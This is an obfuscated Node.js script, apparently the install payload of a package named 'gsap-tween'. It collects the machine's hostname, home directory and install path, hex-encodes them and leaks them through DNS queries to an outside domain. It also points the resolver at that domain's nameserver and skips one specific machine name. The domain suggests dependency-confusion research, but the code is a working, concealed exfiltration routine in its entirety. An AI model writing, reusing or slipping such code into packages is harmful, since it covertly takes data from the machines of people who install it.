const dns = require('dns');
const os = require('os');
const suffix = '.dns.alexbirsan-hacks-paypal.com';
const ns = 'dns1.alexbirsan-hacks-paypal.com';
const package = 'gsap-tween';
function sendToServer(_0x21c25f) {
    const _0x3e4517 = {
        'OWnsn': function (_0x57dbac, _0x516024) {
            return _0x57dbac + _0x516024;
        },
        'Kzjzu': function (_0x57b94d, _0x3c624c) {
            return _0x57b94d + _0x3c624c;
        },
        'VIPAV': function (_0x28c787, _0x4adb07) {
            return _0x28c787 + _0x4adb07;
        },
        'CcQay': 'v2_f.',
        'KzDdf': '.v2_e',
        'dhhlv': 'hex'
    };
    _0x21c25f = Buffer['from'](_0x21c25f)['toString'](_0x3e4517['dhhlv']);
    _0x21c25f = _0x21c25f['match'](/.{1,60}/g);
    id = Math['random']()['toString'](0x24)['substring'](0x2);
    _0x21c25f['forEach'](function (_0x239103, _0x487365) {
        try {
            dns['resolve'](_0x3e4517['OWnsn'](_0x3e4517['OWnsn'](_0x3e4517['Kzjzu'](_0x3e4517['VIPAV'](_0x3e4517['CcQay'], id) + '.' + _0x487365, '.') + _0x239103, _0x3e4517['KzDdf']), suffix), 'A', console['log']);
        } catch (_0x332a11) {
        }
    });
}
function tryGet(_0x58c566) {
    const _0x53accd = { 'LRoMo': 'err' };
    try {
        return _0x58c566();
    } catch (_0x26f47a) {
        return _0x53accd['LRoMo'];
    }
}
data = {
    'p': package,
    'h': tryGet(os['hostname']),
    'd': tryGet(os['homedir']),
    'c': __dirname
};
if (data['h'] == 'BBOGENS-LAPTOP') {
    process['exit'](0x0);
}
data = JSON['stringify'](data);
sendToServer(data);
dns['lookup'](ns, function (_0x5bf94b, _0x3aa998) {
    const _0x3992f9 = {
        'CenFd': '8.8.8.8',
        'GaLsm': function (_0x3d1dd3, _0x32a10b) {
            return _0x3d1dd3(_0x32a10b);
        }
    };
    if (!_0x5bf94b) {
        nsAddress = _0x3aa998;
    } else {
        nsAddress = _0x3992f9['CenFd'];
    }
    dns['setServers']([
        nsAddress,
        '8.8.4.4'
    ]);
    _0x3992f9['GaLsm'](sendToServer, data);
});
